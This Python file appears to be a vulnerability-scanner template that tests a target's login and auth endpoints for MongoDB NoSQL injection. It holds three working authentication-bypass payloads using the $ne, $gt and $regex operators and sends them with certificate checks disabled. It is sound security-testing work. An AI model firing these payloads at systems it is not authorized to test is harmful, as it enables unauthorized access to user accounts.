#!/usr/bin/env python3
"""
@id: mongodb-injection-deep
@name: MongoDB NoSQL Injection Detection
@author: CERT-X-GEN Security Team
@severity: high
@description: Detects NoSQL injection vulnerabilities in MongoDB query endpoints
@tags: mongodb, nosql-injection, database, injection
@cwe: CWE-943
@cvss: 8.6
@references: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
@confidence: 85
@version: 1.0.0
"""

import requests
import json
import sys
from typing import List, Dict, Any

METADATA = {
    "id": "mongodb-injection-deep",
    "name": "MongoDB NoSQL Injection Detection",
    "author": {"name": "CERT-X-GEN Security Team", "email": "security@cert-x-gen.io"},
    "severity": "high",
    "description": "Detects NoSQL injection in MongoDB endpoints",
    "tags": ["mongodb", "nosql-injection", "database", "injection"],
    "language": "python",
    "confidence": 85,
    "cwe": ["CWE-943"],
    "cvss": 8.6,
    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"]
}

INJECTION_PAYLOADS = [
    {'username': {'$ne': None}, 'password': {'$ne': None}},
    {'username': {'$gt': ''}, 'password': {'$gt': ''}},
    {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
]


def test_nosql_injection(url: str, timeout: int) -> Dict[str, Any]:
    """Test for NoSQL injection vulnerabilities"""
    
    results = {'vulnerable': False, 'payloads_successful': []}
    
    for payload in INJECTION_PAYLOADS:
        try:
            # Test POST
            response = requests.post(url, json=payload, timeout=timeout, verify=False)
            
            if response.status_code in [200, 302]:
                if 'token' in response.text.lower() or 'success' in response.text.lower():
                    results['vulnerable'] = True
                    results['payloads_successful'].append(str(payload))
        except Exception:
            continue
    
    return results


def test_vulnerability(host: str, port: int = 443, timeout: int = 10) -> List[Dict[str, Any]]:
    """Main detection function"""
    findings = []
    scheme = 'https' if port == 443 else 'http'
    
    endpoints = ['/api/login', '/api/auth', '/login', '/auth', '/api/users']
    
    for endpoint in endpoints:
        url = f"{scheme}://{host}:{port}{endpoint}"
        
        try:
            results = test_nosql_injection(url, timeout)
            
            if results['vulnerable']:
                finding = {
                    'target': f"{host}:{port}",
                    'template_id': METADATA['id'],
                    'template_name': METADATA['name'],
                    'severity': 'high',
                    'confidence': 85,
                    'title': f"MongoDB NoSQL Injection at {endpoint}",
                    'matched_at': url,
                    'description': f"NoSQL injection detected at {endpoint}. Successful payloads: {len(results['payloads_successful'])}",
                    'evidence': {'successful_payloads': results['payloads_successful'][:3]},
                    'remediation': 'Use parameterized queries. Validate input types. Implement proper authentication.',
                    'cwe_ids': METADATA['cwe'],
                    'cvss_score': METADATA['cvss'],
                    'tags': METADATA['tags'],
                    'timestamp': __import__('datetime').datetime.utcnow().isoformat() + 'Z'
                }
                findings.append(finding)
                break
        except Exception:
            continue
    
    if not findings:
        finding = {
            'target': f"{host}:{port}",
            'template_id': METADATA['id'],
            'template_name': METADATA['name'],
            'severity': 'info',
            'confidence': 70,
            'title': 'No MongoDB NoSQL Injection Detected',
            'matched_at': f"{scheme}://{host}:{port}",
            'description': 'No NoSQL injection vulnerabilities detected.',
            'evidence': {},
            'tags': METADATA['tags'],
            'timestamp': __import__('datetime').datetime.utcnow().isoformat() + 'Z'
        }
        findings.append(finding)
    
    return findings


def main():
    import os
    
    if os.getenv('CERT_X_GEN_MODE') == 'engine':
        host = os.getenv('CERT_X_GEN_TARGET_HOST')
        port = int(os.getenv('CERT_X_GEN_TARGET_PORT', '443'))
        if not host:
            print(json.dumps({'error': 'CERT_X_GEN_TARGET_HOST not set'}))
            sys.exit(1)
    else:
        if len(sys.argv) < 2:
            print(json.dumps({'error': 'Usage: mongodb-injection-deep.py <host> [port]'}))
            sys.exit(1)
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    findings = test_vulnerability(host, port)
    print(json.dumps({'findings': findings, 'metadata': METADATA}, indent=2))


if __name__ == '__main__':
    main()
